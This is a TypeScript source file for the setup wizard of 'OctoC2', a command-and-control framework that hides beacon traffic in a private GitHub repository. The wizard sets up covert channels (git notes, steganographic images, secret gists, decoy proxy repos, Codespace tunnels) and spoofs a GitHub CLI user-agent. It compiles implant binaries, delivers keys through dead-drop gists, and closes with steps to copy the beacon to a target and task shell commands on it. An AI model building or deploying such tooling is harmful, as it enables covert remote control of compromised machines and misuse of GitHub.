// octoctl/src/commands/setup/phases.ts
import * as p from "@clack/prompts";
import { Octokit } from "@octokit/rest";
import { generateOperatorKeyPair, bytesToBase64 } from "../../lib/crypto.ts";
import { checkRepo } from "./validate.ts";
import {
  wizardIntro, wizardOutro, sectionHeader, withSpinner,
  promptPassword, promptText, promptSelect, promptConfirm, maskToken,
} from "./prompts.ts";

const DIM   = "\x1b[2m";
const BOLD  = "\x1b[1m";
const RESET = "\x1b[0m";
const GREEN = "\x1b[32m";
const RED   = "\x1b[31m";
const YELLOW = "\x1b[33m";

export interface SetupState {
  token: string;
  owner: string;
  repo: string;
  operatorSecret: string;
  operatorPublicKey: string;
  authMode: "pat" | "app";
  appId?: number;
  installationId?: number;
  tentaclePriority?: string;
  proxyRepos?: string;
  codespaceName?: string;
  githubUser?: string;
  grpcPort?: string;
  httpUrl?: string;
  sleepSeconds?: number;
  jitter?: number;
  cleanupDays?: number;
  logLevel?: string;
  envPath?: string;
}

// ── Phase 1: Credentials ─────────────────────────────────────────────────────

export async function phaseCredentials(): Promise<{
  token: string;
  owner: string;
  repo: string;
}> {
  sectionHeader("1/10  GitHub Credentials");

  p.note(
    `Your C2 repo is a private GitHub repository where all\n` +
    `beacon traffic flows (issues, branches, gists, etc.).\n\n` +
    `You need a PAT from an account that can access this repo.\n` +
    `Create one at: ${BOLD}github.com/settings/tokens/new${RESET}\n` +
    `Required scope: ${BOLD}repo${RESET}  Optional: ${DIM}gist, codespace${RESET}`,
    "What you'll need"
  );

  const owner = await promptText({
    message: "Repo owner",
    placeholder: "your-username-or-org",
    validate: (v) => (!v.trim() ? "Required" : undefined),
  });

  const repo = await promptText({
    message: "Repo name",
    placeholder: "infrastructure",
    validate: (v) => (!v.trim() ? "Required" : undefined),
  });

  const token = await promptPassword({
    message: `PAT with access to ${owner}/${repo}`,
    validate: (v) => {
      if (!v.trim()) return "Token is required";
      if (!v.startsWith("ghp_") && !v.startsWith("github_pat_"))
        return "Expected a GitHub PAT (ghp_… or github_pat_…)";
    },
  });

  p.log.success(`Token: ${maskToken(token)}`);

  return { token: token.trim(), owner: owner.trim(), repo: repo.trim() };
}

// ── Phase 2: Validate ────────────────────────────────────────────────────────

export async function phaseValidate(
  token: string,
  owner: string,
  repo: string,
): Promise<void> {
  sectionHeader("2/10  Validating GitHub Access");

  const result = await withSpinner(
    `Checking ${owner}/${repo}`,
    () => checkRepo(token, owner, repo),
  );

  if (result.error) {
    p.log.error(result.error);
    const retry = await promptConfirm({ message: "Re-enter credentials?", initialValue: true });
    if (retry) throw new Error("RETRY_CREDENTIALS");
    process.exit(1);
  }

  // Scope check
  const hasRepo = result.scopes.includes("repo");
  if (!hasRepo) {
    p.log.warn("PAT is missing 'repo' scope — most tentacles will fail");
  } else {
    p.log.success(`Scopes: ${result.scopes.join(", ")}`);
  }

  // Privacy check
  if (!result.private) {
    p.log.warn(`${owner}/${repo} is PUBLIC — strongly recommend making it private`);
    const proceed = await promptConfirm({ message: "Continue anyway?", initialValue: false });
    if (!proceed) process.exit(0);
  } else {
    p.log.success("Repo is private");
  }

  // Issues check
  if (!result.hasIssues) {
    p.log.warn("Issues are disabled — the issues tentacle won't work");
  } else {
    p.log.success("Issues enabled");
  }
}

// ── Phase 3: Keygen ──────────────────────────────────────────────────────────

export async function phaseKeygen(
  token: string,
  owner: string,
  repo: string,
): Promise<{ operatorSecret: string; operatorPublicKey: string }> {
  sectionHeader("3/10  Operator Keypair");

  p.note(
    `Generates an X25519 keypair for end-to-end encryption.\n\n` +
    `${BOLD}Secret key${RESET} — stays on your machine (written to .env)\n` +
    `${BOLD}Public key${RESET} — pushed to the C2 repo as a GitHub Variable`,
    "Encryption"
  );

  const existingSecret = process.env["OCTOC2_OPERATOR_SECRET"]?.trim();
  if (existingSecret) {
    const reuse = await promptConfirm({
      message: "Existing OCTOC2_OPERATOR_SECRET found in env. Reuse it?",
      initialValue: true,
    });
    if (reuse) {
      p.log.success("Reusing existing keypair");
      return { operatorSecret: existingSecret, operatorPublicKey: "(existing)" };
    }
  }

  const kp = await withSpinner("Generating X25519 keypair", async () => {
    const keys = await generateOperatorKeyPair();
    return {
      secret: await bytesToBase64(keys.secretKey),
      public: await bytesToBase64(keys.publicKey),
    };
  });

  p.note(
    `Public:  ${kp.public}\n` +
    `Secret:  ${DIM}(saved to .env — never share this)${RESET}`,
    "Keypair generated"
  );

  const pushVar = await promptConfirm({
    message: `Push public key to MONITORING_PUBKEY on ${owner}/${repo}?`,
    initialValue: true,
  });

  if (pushVar) {
    await withSpinner("Setting MONITORING_PUBKEY variable", async () => {
      const octokit = new Octokit({
        auth: token,
        headers: { "user-agent": "GitHub CLI/gh/2.48.0 (linux; amd64) go/1.23.0" },
      });
      try {
        // Try update first (common case — variable already exists)
        await octokit.request("PATCH /repos/{owner}/{repo}/actions/variables/{name}", {
          owner, repo, name: "MONITORING_PUBKEY", value: kp.public,
        });
      } catch {
        // Variable doesn't exist yet — create it
        await octokit.request("POST /repos/{owner}/{repo}/actions/variables", {
          owner, repo, name: "MONITORING_PUBKEY", value: kp.public,
        });
      }
    });
  }

  return { operatorSecret: kp.secret, operatorPublicKey: kp.public };
}

// ── Phase 4: Auth Mode ───────────────────────────────────────────────────────

export async function phaseAuthMode(): Promise<{
  authMode: "pat" | "app";
  appId?: number;
  installationId?: number;
}> {
  sectionHeader("4/10  Beacon Authentication");

  const mode = await promptSelect<"pat" | "app">({
    message: "How should the beacon authenticate to GitHub?",
    options: [
      { value: "pat", label: "PAT only", hint: "your PAT is baked into the binary" },
      { value: "app", label: "GitHub App", hint: "rotating 1hr tokens, private key delivered via dead-drop" },
    ],
  });

  if (mode === "pat") return { authMode: "pat" };

  p.note(
    `Create a GitHub App at: ${BOLD}github.com/settings/apps/new${RESET}\n\n` +
    `Permissions needed:\n` +
    `  Contents     Read & Write\n` +
    `  Issues       Read & Write\n` +
    `  Variables    Read & Write\n` +
    `  Actions      Read & Write\n\n` +
    `After creating, install it on your C2 repo.\n` +
    `The App ID is on the app settings page.\n` +
    `The Installation ID is in the URL after installing.`,
    "GitHub App setup"
  );

  const appIdStr = await promptText({
    message: "App ID",
    placeholder: "123456",
    validate: (v) => (isNaN(parseInt(v, 10)) ? "Must be a number" : undefined),
  });

  const installIdStr = await promptText({
    message: "Installation ID",
    placeholder: "987654",
    validate: (v) => (isNaN(parseInt(v, 10)) ? "Must be a number" : undefined),
  });

  p.log.info(`${DIM}Private key is never baked — deliver after deployment with:${RESET}`);
  p.log.info(`${DIM}octoctl drop create --beacon <id> --app-key-file <pem>${RESET}`);

  return {
    authMode: "app",
    appId: parseInt(appIdStr, 10),
    installationId: parseInt(installIdStr, 10),
  };
}

// ── Phase 5: Tentacle Selection ──────────────────────────────────────────────

export async function phaseTentacles(): Promise<string | undefined> {
  sectionHeader("5/10  Covert Channels");

  const mode = await promptSelect<"auto" | "custom">({
    message: "Channel selection strategy",
    options: [
      { value: "auto", label: "Auto-detect", hint: "stealth-first ordering, automatic fallback" },
      { value: "custom", label: "Custom", hint: "pick channels and set priority order" },
    ],
  });

  if (mode === "auto") return undefined;

  const channels = await p.multiselect({
    message: "Select channels (top = highest priority)",
    options: [
      { value: "notes",    label: "Notes",          hint: "refs/notes — invisible to GitHub UI" },
      { value: "stego",    label: "Steganography",   hint: "LSB-encoded PNG in branches" },
      { value: "gist",     label: "Gist",            hint: "secret gists — not visible in repo" },
      { value: "branch",   label: "Branch",          hint: "file dead-drops on infra-sync branches" },
      { value: "actions",  label: "Actions",         hint: "Variables API — only inside GH Actions" },
      { value: "secrets",  label: "Secrets",         hint: "Variables API — out-of-band config" },
      { value: "proxy",    label: "OctoProxy",       hint: "relay through decoy repos" },
      { value: "issues",   label: "Issues",          hint: "encrypted comments — always available" },
    ],
  });

  if (p.isCancel(channels)) {
    p.cancel("Setup cancelled.");
    process.exit(0);
  }

  return (channels as string[]).join(",");
}

// ── Phase 6: Advanced Configuration ──────────────────────────────────────────

export interface AdvancedConfig {
  proxyRepos?: string;
  codespaceName?: string;
  githubUser?: string;
  grpcPort?: string;
  httpUrl?: string;
  sleepSeconds?: number;
  jitter?: number;
  cleanupDays?: number;
  logLevel?: string;
}

export async function phaseAdvanced(): Promise<AdvancedConfig> {
  sectionHeader("6/10  Advanced Configuration");

  const configure = await promptConfirm({
    message: "Configure advanced options? (proxy repos, codespace gRPC, sleep tuning)",
    initialValue: false,
  });

  if (!configure) return {};

  const config: AdvancedConfig = {};

  // ── Proxy repos ──────────────────────────────────────────────────────────
  const useProxy = await promptConfirm({
    message: "Use OctoProxy relay repos?",
    initialValue: false,
  });

  if (useProxy) {
    p.note(
      `Proxy repos relay beacon traffic through decoy repositories.\n` +
      `Each entry needs: owner, repo name, and a PAT for that repo.\n\n` +
      `Format: JSON array of objects with owner, repo, token fields.`,
      "OctoProxy"
    );

    const proxyEntries: Array<{ owner: string; repo: string; token: string; innerKind: string }> = [];
    let addMore = true;

    while (addMore) {
      const proxyOwner = await promptText({
        message: "Proxy repo owner",
        placeholder: "decoy-org",
        validate: (v) => (!v.trim() ? "Required" : undefined),
      });

      const proxyRepo = await promptText({
        message: "Proxy repo name",
        placeholder: "infra-sync",
        validate: (v) => (!v.trim() ? "Required" : undefined),
      });

      const proxyToken = await promptPassword({
        message: `PAT for ${proxyOwner}/${proxyRepo}`,
        validate: (v) => (!v.trim() ? "Required" : undefined),
      });

      const innerKind = await promptSelect<"issues" | "notes">({
        message: "Inner channel for this proxy",
        options: [
          { value: "issues", label: "Issues", hint: "default" },
          { value: "notes", label: "Notes", hint: "stealthier" },
        ],
      });

      proxyEntries.push({
        owner: proxyOwner.trim(),
        repo: proxyRepo.trim(),
        token: proxyToken.trim(),
        innerKind,
      });

      addMore = await promptConfirm({ message: "Add another proxy repo?", initialValue: false });
    }

    config.proxyRepos = JSON.stringify(proxyEntries);
    p.log.success(`${proxyEntries.length} proxy repo(s) configured`);
  }

  // ── Codespace gRPC ───────────────────────────────────────────────────────
  const useCodespace = await promptConfirm({
    message: "Use Codespace gRPC channel?",
    initialValue: false,
  });

  if (useCodespace) {
    p.note(
      `The gRPC channel tunnels through a GitHub Codespace via SSH.\n` +
      `The beacon connects to the Codespace and forwards gRPC traffic\n` +
      `to the C2 server running inside it.`,
      "Codespace gRPC"
    );

    config.codespaceName = (await promptText({
      message: "Codespace name",
      placeholder: "org-repo-abc123",
      validate: (v) => (!v.trim() ? "Required" : undefined),
    })).trim();

    config.githubUser = (await promptText({
      message: "GitHub username for SSH auth",
      placeholder: "your-username",
      validate: (v) => (!v.trim() ? "Required" : undefined),
    })).trim();

    config.grpcPort = (await promptText({
      message: "gRPC port inside Codespace",
      initialValue: "50051",
      placeholder: "50051",
    })).trim();
  }

  // ── HTTP/WebSocket ───────────────────────────────────────────────────────
  const useHttp = await promptConfirm({
    message: "Use HTTP/WebSocket channel?",
    initialValue: false,
  });

  if (useHttp) {
    config.httpUrl = (await promptText({
      message: "HTTP base URL",
      placeholder: "https://codespace-8080.app.github.dev",
      validate: (v) => (!v.trim() ? "Required" : undefined),
    })).trim();
  }

  // ── Beacon tuning ────────────────────────────────────────────────────────
  const tuneSleep = await promptConfirm({
    message: "Customize beacon sleep interval?",
    initialValue: false,
  });

  if (tuneSleep) {
    const sleepStr = await promptText({
      message: "Sleep seconds between check-ins",
      initialValue: "60",
      validate: (v) => (isNaN(parseInt(v, 10)) ? "Must be a number" : undefined),
    });
    config.sleepSeconds = parseInt(sleepStr, 10);

    const jitterStr = await promptText({
      message: "Jitter factor (0.0–1.0)",
      initialValue: "0.3",
      validate: (v) => {
        const n = parseFloat(v);
        if (isNaN(n) || n < 0 || n > 1) return "Must be 0.0–1.0";
      },
    });
    config.jitter = parseFloat(jitterStr);
  }

  // ── Cleanup + logging ────────────────────────────────────────────────────
  const logLevel = await promptSelect<"info" | "warn" | "error" | "debug">({
    message: "Log level",
    options: [
      { value: "info", label: "Info", hint: "default" },
      { value: "warn", label: "Warn", hint: "quieter" },
      { value: "error", label: "Error", hint: "silent except errors" },
      { value: "debug", label: "Debug", hint: "verbose — for troubleshooting" },
    ],
  });
  if (logLevel !== "info") config.logLevel = logLevel;

  const cleanupStr = await promptText({
    message: "Auto-cleanup result comments after N days (blank = never)",
    placeholder: "leave blank to skip",
  });
  if (cleanupStr.trim()) {
    const n = parseInt(cleanupStr, 10);
    if (!isNaN(n) && n >= 0) config.cleanupDays = n;
  }

  return config;
}

// ── Phase 7: Write .env ──────────────────────────────────────────────────────

export interface EnvFileInput {
  token: string;
  owner: string;
  repo: string;
  operatorSecret: string;
  operatorPublicKey: string;
  appId?: number;
  installationId?: number;
  tentaclePriority?: string;
  proxyRepos?: string;
  codespaceName?: string;
  githubUser?: string;
  grpcPort?: string;
  httpUrl?: string;
  sleepSeconds?: number;
  jitter?: number;
  cleanupDays?: number;
  logLevel?: string;
}

export function generateEnvFile(input: EnvFileInput): string {
  const lines: string[] = [
    `# OctoC2 environment — generated by octoctl setup`,
    `# ${new Date().toISOString().slice(0, 10)}`,
    ``,
    `# ── C2 repo ─────────────────────────────────────────────────────────────────`,
    `OCTOC2_GITHUB_TOKEN=${input.token}`,
    `OCTOC2_REPO_OWNER=${input.owner}`,
    `OCTOC2_REPO_NAME=${input.repo}`,
    ``,
    `# ── Operator keypair ────────────────────────────────────────────────────────`,
    `OCTOC2_OPERATOR_SECRET=${input.operatorSecret}`,
    `# MONITORING_PUBKEY=${input.operatorPublicKey}`,
  ];

  if (input.appId !== undefined || input.installationId !== undefined) {
    lines.push(``);
    lines.push(`# ── GitHub App ──────────────────────────────────────────────────────────────`);
    if (input.appId !== undefined) lines.push(`SVC_APP_ID=${input.appId}`);
    if (input.installationId !== undefined) lines.push(`SVC_INSTALLATION_ID=${input.installationId}`);
    lines.push(`# Private key delivered via dead-drop (never baked)`);
  }

  if (input.tentaclePriority) {
    lines.push(``);
    lines.push(`# ── Tentacle priority ───────────────────────────────────────────────────────`);
    lines.push(`SVC_TENTACLE_PRIORITY=${input.tentaclePriority}`);
  }

  if (input.proxyRepos) {
    lines.push(``);
    lines.push(`# ── Proxy relay repos ───────────────────────────────────────────────────────`);
    lines.push(`SVC_PROXY_REPOS='${input.proxyRepos}'`);
  }

  if (input.codespaceName || input.githubUser) {
    lines.push(``);
    lines.push(`# ── Codespace gRPC channel ──────────────────────────────────────────────────`);
    if (input.codespaceName) lines.push(`SVC_GRPC_CODESPACE_NAME=${input.codespaceName}`);
    if (input.githubUser) lines.push(`SVC_GITHUB_USER=${input.githubUser}`);
    if (input.grpcPort) lines.push(`SVC_GRPC_PORT=${input.grpcPort}`);
  }

  if (input.httpUrl) {
    lines.push(``);
    lines.push(`# ── HTTP/WebSocket channel ──────────────────────────────────────────────────`);
    lines.push(`SVC_HTTP_URL=${input.httpUrl}`);
  }

  const hasAdvanced = input.sleepSeconds || input.jitter || input.cleanupDays || input.logLevel;
  if (hasAdvanced) {
    lines.push(``);
    lines.push(`# ── Beacon tuning ───────────────────────────────────────────────────────────`);
    if (input.sleepSeconds) lines.push(`SVC_SLEEP=${input.sleepSeconds}`);
    if (input.jitter) lines.push(`SVC_JITTER=${input.jitter}`);
    if (input.cleanupDays !== undefined) lines.push(`SVC_CLEANUP_DAYS=${input.cleanupDays}`);
    if (input.logLevel) lines.push(`OCTOC2_LOG_LEVEL=${input.logLevel}`);
  }

  lines.push(``);
  return lines.join("\n");
}

export async function phaseWriteEnv(state: SetupState): Promise<string> {
  sectionHeader("7/10  Environment File");

  const { resolve } = await import("node:path");
  const defaultPath = resolve(process.cwd().replace(/\/octoctl$/, ""), ".env");

  const envPath = await promptText({
    message: "Write .env to",
    initialValue: defaultPath,
    placeholder: defaultPath,
  });

  const content = generateEnvFile(state);

  const { existsSync } = await import("node:fs");
  if (existsSync(envPath)) {
    const overwrite = await promptConfirm({
      message: `${envPath} exists. Overwrite?`,
      initialValue: false,
    });
    if (!overwrite) {
      p.log.info("Skipped");
      return envPath;
    }
  }

  await Bun.write(envPath, content);
  p.log.success(`Saved to ${envPath}`);
  return envPath;
}

// ── Phase 7: Build Beacon ────────────────────────────────────────────────────

export async function phaseBuildBeacon(state: SetupState): Promise<string | undefined> {
  sectionHeader("8/10  Build Beacon");

  const build = await promptConfirm({
    message: "Compile a beacon binary now?",
    initialValue: true,
  });

  if (!build) {
    p.log.info(`${DIM}Build later: octoctl build-beacon --outfile ./beacon${RESET}`);
    return undefined;
  }

  const target = await promptSelect<string>({
    message: "Target platform",
    options: [
      { value: "bun-linux-x64",    label: "Linux x64" },
      { value: "bun-linux-arm64",  label: "Linux ARM64" },
      { value: "bun-windows-x64",  label: "Windows x64" },
      { value: "bun-darwin-arm64", label: "macOS ARM64 (Apple Silicon)" },
      { value: "bun-darwin-x64",   label: "macOS x64 (Intel)" },
    ],
  });

  const outfile = await promptText({
    message: "Output path",
    initialValue: "./beacon",
    placeholder: "./beacon",
  });

  const args = [
    "run", "octoctl/src/index.ts", "build-beacon",
    "--outfile", outfile,
    "--target", target,
  ];
  if (state.tentaclePriority) {
    args.push("--tentacle-priority", state.tentaclePriority);
  }
  if (state.appId !== undefined) {
    args.push("--app-id", String(state.appId));
  }
  if (state.installationId !== undefined) {
    args.push("--installation-id", String(state.installationId));
  }

  let buildOutput = "";
  await withSpinner("Compiling beacon", async () => {
    const bunBin = Bun.which("bun") ?? `${process.env.HOME}/.bun/bin/bun`;
    // build-beacon expects cwd = project root (looks for ./implant/src/index.ts)
    const projectRoot = process.cwd().replace(/\/octoctl$/, "");
    const proc = Bun.spawn([bunBin, ...args], {
      stdout: "pipe",
      stderr: "pipe",
      cwd: projectRoot,
      env: {
        ...process.env,
        OCTOC2_GITHUB_TOKEN: state.token,
        OCTOC2_REPO_OWNER: state.owner,
        OCTOC2_REPO_NAME: state.repo,
      },
    });
    const code = await proc.exited;
    if (code !== 0) {
      const stderr = await new Response(proc.stderr).text();
      throw new Error(`Build failed (exit ${code})${stderr ? `\n${stderr.trim()}` : ""}`);
    }
    buildOutput = await new Response(proc.stdout).text();
  });

  // Extract beacon ID from build-beacon output
  const idMatch = buildOutput.match(/Beacon ID:\s+(\S+)/);
  const beaconId = idMatch?.[1];

  const details = [`Path: ${outfile}`];
  if (beaconId) details.push(`Beacon ID: ${beaconId}`);
  p.note(details.join("\n"), "Beacon compiled");
  if (beaconId) {
    p.log.info(`${DIM}Use this ID for tasking: octoctl task ${beaconId.slice(0, 8)} --kind shell --cmd "id"${RESET}`);
  }

  return beaconId;
}

// ── Phase 8b: Dead-drop for App auth ─────────────────────────────────────────

export async function phaseDeadDrop(state: SetupState, beaconId?: string): Promise<void> {
  if (state.authMode !== "app" || !beaconId) return;

  sectionHeader("8b  Deploy App Private Key");

  p.note(
    `Your beacon uses GitHub App auth, so the private key must be\n` +
    `delivered via an encrypted dead-drop gist — it's never baked\n` +
    `into the binary.\n\n` +
    `Beacon ID: ${BOLD}${beaconId}${RESET}`,
    "Dead-drop"
  );

  const createDrop = await promptConfirm({
    message: "Create the dead-drop now?",
    initialValue: true,
  });

  if (!createDrop) {
    p.log.info(`${DIM}Create later: octoctl drop create --beacon ${beaconId.slice(0, 8)} --app-key-file <pem>${RESET}`);
    return;
  }

  const keyPath = await promptText({
    message: "Path to App private key PEM file",
    placeholder: "~/.config/octoc2/app-key.pem",
    validate: (v) => {
      if (!v.trim()) return "Required";
      const { existsSync } = require("node:fs");
      const resolved = v.trim().replace(/^~/, process.env.HOME ?? "");
      if (!existsSync(resolved)) return `File not found: ${resolved}`;
    },
  });

  const resolvedKeyPath = keyPath.trim().replace(/^~/, process.env.HOME ?? "");

  await withSpinner("Creating dead-drop gist", async () => {
    const bunBin = Bun.which("bun") ?? `${process.env.HOME}/.bun/bin/bun`;
    const projectRoot = process.cwd().replace(/\/octoctl$/, "");
    const proc = Bun.spawn([
      bunBin, "run", "octoctl/src/index.ts", "drop", "create",
      "--beacon", beaconId.slice(0, 8),
      "--app-key-file", resolvedKeyPath,
    ], {
      stdout: "pipe",
      stderr: "pipe",
      cwd: projectRoot,
      env: {
        ...process.env,
        OCTOC2_GITHUB_TOKEN: state.token,
        OCTOC2_REPO_OWNER: state.owner,
        OCTOC2_REPO_NAME: state.repo,
        OCTOC2_OPERATOR_SECRET: state.operatorSecret,
      },
    });
    const code = await proc.exited;
    if (code !== 0) {
      const stderr = await new Response(proc.stderr).text();
      throw new Error(`Dead-drop failed (exit ${code})${stderr ? `\n${stderr.trim()}` : ""}`);
    }
  });

  p.log.success("Dead-drop created — beacon will pick up the key on next recovery cycle");
}

// ── Phase 9: Install to PATH ─────────────────────────────────────────────────

export async function phaseInstall(): Promise<void> {
  sectionHeader("9/10  Install CLI");

  const install = await promptConfirm({
    message: "Add octoctl to PATH? (/usr/local/bin/octoctl)",
    initialValue: true,
  });

  if (!install) {
    p.log.info(`${DIM}Run manually: bun run octoctl/src/index.ts <command>${RESET}`);
    return;
  }

  const projectRoot = process.cwd().replace(/\/octoctl$/, "");
  const scriptContent = `#!/bin/sh\nexec bun "${projectRoot}/octoctl/src/index.ts" "$@"\n`;
  const targetPath = "/usr/local/bin/octoctl";

  try {
    const { writeFileSync, chmodSync } = await import("node:fs");
    writeFileSync(targetPath, scriptContent, { mode: 0o755 });
    chmodSync(targetPath, 0o755);
    p.log.success(`Installed to ${targetPath}`);
  } catch {
    p.log.warn("Permission denied — trying sudo");
    const tmpPath = `/tmp/octoctl-install-${Date.now()}`;
    const { writeFileSync } = await import("node:fs");
    writeFileSync(tmpPath, scriptContent, { mode: 0o755 });

    const proc = Bun.spawn(["sudo", "cp", tmpPath, targetPath], {
      stdout: "inherit",
      stderr: "inherit",
    });
    const code = await proc.exited;
    if (code === 0) {
      Bun.spawn(["sudo", "chmod", "+x", targetPath], { stdout: "pipe", stderr: "pipe" });
      p.log.success(`Installed to ${targetPath}`);
    } else {
      p.log.error("Install failed. Run manually:");
      p.log.info(`sudo ln -sf "${projectRoot}/octoctl/src/index.ts" ${targetPath}`);
    }

    try { (await import("node:fs")).unlinkSync(tmpPath); } catch {}
  }
}

// ── Phase 9: Done ────────────────────────────────────────────────────────────

export async function phaseVerify(state: SetupState): Promise<void> {
  sectionHeader("10/10  Ready");

  const steps = [
    `octoctl start                           ${DIM}# launch server + dashboard${RESET}`,
    `scp ./beacon target:/tmp/beacon         ${DIM}# deploy to target${RESET}`,
    `ssh target '/tmp/beacon &'              ${DIM}# run beacon${RESET}`,
    `octoctl beacons                         ${DIM}# verify registration (~60s)${RESET}`,
    `octoctl task <id> --kind shell --cmd id ${DIM}# first task${RESET}`,
    `octoctl results <id>                    ${DIM}# read output${RESET}`,
  ];

  if (state.authMode === "app") {
    steps.splice(1, 0,
      `octoctl drop create --beacon <id> \\`,
      `  --app-key-file <pem>                  ${DIM}# deliver app private key${RESET}`,
    );
  }

  p.note(steps.join("\n"), "Next steps");
}
